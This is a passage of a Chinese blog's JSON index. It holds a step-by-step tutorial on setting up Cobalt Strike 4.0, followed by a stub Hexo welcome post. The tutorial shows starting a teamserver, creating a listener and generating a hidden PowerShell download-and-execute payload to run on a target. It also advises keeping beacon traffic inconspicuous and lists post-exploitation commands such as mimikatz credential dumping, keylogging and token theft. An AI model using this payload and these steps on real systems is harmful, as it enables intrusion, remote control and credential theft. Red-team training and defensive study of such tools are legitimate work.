的攻击和防御都不用在Metasploit Framework平台（界面）下进行。 如今 Cobalt Strike 4.0 也已经发布，改动相比 3.x 还是不小的，笔者在演示的时候使用的 Cobalt Strike 4.0，看的视频教程是 3.x 的教程。 接下来会用到的工具和环境 Cobalt Strike Kali Metasploit Framework PowerSploit PowerTools Veil Evasion Framework 2.Cobalt Strike 安装2.1 安装Java运行环境因为启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。Java环境的安装可以参考：https://www.runoob.com/java/java-environment-setup.html 因为安装kali时，默认会安装java环境。我们可以通过java -version进行验证。 2.2 部署TeamServer在安装Cobalt Strike时，必须搭建团队服务器（TeamServer服务器）。打开cobaltstrike文件夹，赋予TeamServer 和 Cabalt Strike执行权限。 1chmod +x teamserver cobaltstrike Cobalt Strike 文件夹中有多个文件和文件夹。 其功能如下。 agscript：拓展应用的脚本。 c2lint：用于检查profile 的错误和异常。 teamserver：团队服务器程序。 cobaltstrike 和 cobaltstrike.jar:客户端程序。因为teamserver文件是通过Java来调用CobaltStrike 的，所以直接在命令行环境中输入第一个文件的内容也能启动Cobalt Strike 客户端 (主要是为了方便操作)。 logs:日志，包括 Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等。 datas：用于保存当前TeamServer的一些数据。 update 和 update.jar：用于更新Cobalt Strike。 最后，运行团队服务器。需要设置当前主机的IP地址和TeamServer的密码。输入如下命令启动TeamServer。 1./teamserver 10.251.0.35 sangfor Cobalt Strike的TeamServer准备就绪。接下来，我们就可以启动Cobalt Strike客户端来连接TeamServer了。 3.Cobalt Strike 启动3.1 启动cobaltstrike.jar在Linux下，可以直接通过./cobaltstrike启动客户端，如下图。 1./cobaltstrike 填写TeamServer的IP地址、端口号、用户名、密码。在这里，登录的用户名可以任意输名称，只要保证当前该用户名没有被用来登录Cobalt Strike服务器即可。 在确认信息填写无误后，点击Connect连接服务端，这时候会出现指纹校验对话框。指纹校验的主要作用是防篡改，且每次创建Cobalt Strike团队服务器时生成的指纹都不一样。 在客户端向服务器成功获取相关信息后，即可打开Cobalt Strike 主页面，Cobalt Strike 主页面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输出区、控制台命令输入区。 菜单栏：集成了Cobalt Strike的所有功能。 快捷功能区：列出常用的功能。 目标列表：根据不同的显示模式，显示已获取权限的主机及目标主机。 控制台命令输出区：输出命令的执行结果。 控制台命令输人区：输入命令。 Windows中，可以直接允许.bat程序，然后输入teamserver服务器的IP地址和密码进行连接即可。 3.2 利用Cobalt Strike 获取第一个Beacon建立Listener 可以通过菜单栏的第一个选项”Cobalt Strike”进人”Listeners” 面板，如下图。 也可以通过快捷功能区进入”Listeners” 面板，如下图。 单击“Add” 按钮，新建一个监听器，输入名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置。 使用 Web Delivery 执行Payload 单击 “Attacks” 菜单，选择”Web Drive-by”→”Scripted Web Delivery”选项，如下图。 或者通过快捷功能区，打开“Scripted Web Delivery”窗口，如下图。 保持默认配置，选择已经创建的监听器，设置类型为PowerShell,然后单击“Launch”按钮，如下图。 最后，将Cobalt Strike生成的Payload完整地复制下来，如下图。 1powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot; 其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。访问这个url，可以看到是一段powershell代码，如下图。 在目标机器上执行Payload 执行Payload，Cobalt Strike 会收到一个Beacon，如下图。 执行以后，可以在Cobalt Strike的日志里面看到一条日志，如下图。 在Cobalt Strike 的主页面中可以看到一台机器上线（包含外网IP地址，内网IP地址、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息），如下图: 与目标主机进行交互操作 单击右键，在弹出的快捷菜单中选中需要操作的Beacon，然后单击”Interact”选项，进入主机交互模式，如下图。 现在就可以输入一些命令来执行相关操作了。输入”shell whoami”命令,查看当前用户，在心跳时间后就会执行该命令。在执行命令时，需要在命令前添加”shell”。Beacon的每次回连时间默认为60秒。如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。拿到Beacon后，我一般先执行sleep 5，大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。回连后，执行命令的任务将被下发，并成功回显命令的执行结果，如下图。 其他的Beacon命令，大家可以在Beacon中输入help来获取。在这贴出一部分汉化的命令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990Beacon Commands Command Description ------- ----------- browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect Connect to a Beacon peer over TCP covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权 execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs Enable system privileges on current token getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话 jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link Connect to a Beacon peer over a named pipe logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid Set parent PID for spawned post-ex jobs ps 显示进程列表 p**ec Use a service to spawn a session on a host p**ec_psh Use PowerShell to spawn a session on a host psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg Query the registry rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu Execute a program under another PID screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink Disconnect from parent Beacon upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 argue 进程参数欺骗","tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"}],"categories":[{"name":"威胁猎捕","slug":"威胁猎捕","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"},{"name":"Cobalt Strike","slug":"威胁猎捕/Cobalt-Strike","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"}]},{"title":"Hello World","date":"2021-06-28T11:10:07.606Z","path":"wiki/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[],"categories":[]}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"},{"name":"OpenSSL","slug":"漏洞相关/OpenSSL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/"},{"name":"MSSQL","slug":"漏洞相关/MSSQL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/"},{"name":"威胁猎捕","slug":"威胁猎捕","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"},{"name":"Cobalt Strike","slug":"威胁猎捕/Cobalt-Strike","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"},{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"Oracle Database","slug":"数据库安全/Oracle-Database","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"},{"name":"SQL Server","slug":"数据库安全/SQL-Server","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL-Server/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"http://example.com/tags/OpenSSL/"},{"name":"MSSQL","slug":"MSSQL","permalink":"http://example.com/tags/MSSQL/"},{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"},{"name":"Oracle Database","slug":"Oracle-Database","permalink":"http://example.com/tags/Oracle-Database/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"http://example.com/tags/SQL-Server/"}]}